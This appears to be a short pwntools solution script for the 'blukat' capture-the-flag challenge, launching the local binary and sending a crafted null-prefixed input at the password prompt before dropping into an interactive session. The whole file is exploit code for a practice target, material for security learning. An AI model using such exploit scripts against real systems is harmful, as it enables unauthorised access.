from pwn import *

context.log_level = 'DEBUG'

p = process('./blukat')
pause()

p.sendlineafter(b'password!\n', p64(0) + b'a')

p.interactive()